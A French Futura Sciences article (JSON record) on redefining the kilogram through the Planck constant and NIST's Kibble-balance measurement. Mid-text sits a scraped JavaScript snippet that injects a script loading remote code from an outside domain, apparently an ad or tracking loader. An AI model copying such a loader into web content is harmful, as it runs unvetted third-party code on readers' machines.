{"title": "La physique quantique aura-t-elle raison du kilogramme en platine ?", "newspaper": "Futura Sciences", "author": ["Nathalie Mayer"], "date_publi": "2017-10-21", "content": "Le kilogramme a du souci a se faire. Du 16 au 20 octobre 2017, le Comite international des poids et mesures s'est reuni en region parisienne pour envisager une revision des quatre unites de base, le kilogramme, l'ampere, le kelvin et la mole. De nouvelles definitions pourraient entrer en vigueur en mai 2019. Il y a quelques mois, nous evoquions justement le cas du kilogramme, un peu trop vieillot. De toutes les unites, il est le seul a ne pas avoir ete << dematerialise >>. La barre de platine irridie pieusement conservee a Sevres, pres de Paris, reste toujours la reference mondiale pour la masse. Ses jours sont comptes apres la mise au point d'un procede fonde sur la constante de Planck. Article paru le 3 juillet 2017 Depuis 1889, la  definition du kilogramme  est donnee par un cylindre constitue d'un  alliage  de  platine  (90 %) et d' iridium  (10 %). Surnomme le Grand K, il sert aujourd'hui encore d'etalon international. Aujourd'hui encore, mais plus pour tres longtemps. Car en novembre 2018, la definition du  kilogramme  -- comme celles d'autres unites du  Systeme International  (SI) -- sera revue. Le Grand K en effet, malgre toutes les precautions qui l'entourent, perd inexorablement de sa  masse  par simple  diffusion  de ses  atomes  dans l' air  ambiant, meme si, bien sur, il est soigneusement isole. Lorsqu'il a ete pese en 1946, il pesait 30 microgrammes de moins que ses temoins. Et en 1992, il avait encore perdu 20 microgrammes... Une difference infime pour nous. Mais inacceptable en metrologie. Les physiciens revent de s'affranchir d'un objet materiel afin de definir le kilogramme de maniere extremement precise et perenne, comme cela a ete fait depuis longtemps pour le metre et la seconde. Ce que proposent des chercheurs de l' Institut americain des normes et des technologies , le  NIST , c'est de fonder une nouvelle definition du kilogramme sur l'une des  constantes fondamentales de la physique  rattachee a la  theorie quantique , la  constante de Planck . Rappelons que la  constante de Planck  -- decouverte par le physicien du meme nom en 1900 -- definit le seuil d' energie  minimum que l'on puisse mesurer sur une particule. Elle nous apprend ainsi que les echanges d'energie entre  matiere  et rayonnement ne se font pas de maniere continue, mais plutot de facon discrete, c'est-a-dire quantifiee. Et la constante de Planck, en definissant la valeur de ces quanta, relie aussi la  masse  a l'energie electromagnetique. En 2013, avant le lancement de leurs experiences, les chercheurs du NIST avaient parie sur la valeur qu'ils determineraient de la constante de Planck. L'un d'entre eux a descendu l'incertitude a seulement cinq milliardiemes. (c) NIST                               De la constante de Planck au kilogramme Pour mesurer la constante de Planck, les chercheurs du NIST ont fait appel a un procede connu et envisage de longue date, la balance du  watt , encore appelee balance de Kibble, en l'honneur du physicien qui a invente la technique. L'idee : utiliser des forces electromagnetiques pour equilibrer des masses. Les forces electromagnetiques en question naissent d'une bobine placee entre deux  aimants  permanents. Lorsqu'un  courant electrique  traverse la bobine, un  champ magnetique  est cree. Il interagit avec celui genere par les aimants permanents, creant une force qui equilibre les masses. Par ailleurs, lorsque la bobine est soulevee a une  vitesse  constante, le  mouvement  induit une tension dans la bobine, proportionnelle a l'intensite du champ magnetique.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"https://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  \" Une incertitude de 13 milliardiemes Apres avoir accumule, pendant 16 mois, plus de 10.000 mesures de courant, de tension et de vitesse de la bobine, les chercheurs du NIST ont pu calculer la plus precise des valeurs de cette constante de Planck jamais etablies : 6,626069934 x 10 -34  kg.m 2 .s -1 . L'incertitude est de seulement 13 x 10 -9 , meilleure, meme, que ce qu'exige la redefinition du kilogramme. Cette mesure vient renforcer d'autres mesures realisees, l'une par le  National Research Council  du Canada a l'aide egalement d'une balance de Kibble et l'autre par la technique dite d' Avogadro  qui consiste a compter le nombre d'atomes dans une sphere de  silicium . Elle devrait donc permettre au Comite de donnees pour la science et la technologie (Codata) de fixer une nouvelle valeur de la constante de Planck et, avec elle, une valeur precise du kilogramme. Ce qu'il faut retenir Le kilogramme est aujourd'hui encore defini a partir d'un objet physique, le kilogramme etalon, conserve en France, au BIPM (Bureau international des poids et mesures). Pour plus de precision, les chercheurs souhaitent deduire la valeur du kilogramme d'une constante fondamentale de la physique quantique, la constante de Planck. La constante de Planck vaut 6,626069934 x 10 -34  kg.m 2 .s -1  a 13 x 10 -9  pres. Une nouvelle definition du kilogramme sera officielle annoncee en novembre 2018. Cela vous interessera aussi Interview : les constantes fondamentales pourraient-elles changer ?                       Dans le domaine des sciences, il existe des constantes physiques dont la valeur numerique est fixe. Ces valeurs, independantes de tout autre parametre, pourraient-elles changer au cours du temps et de l'espace ? Dans le cadre de sa serie de videos Questions d'experts, sur la physique et l'astrophysique, l'editeur De Boeck a interroge Richard Taillet, chercheur au Lapth, afin qu'il nous parle plus longuement de ces constantes.                                       ", "theme": "sciences"}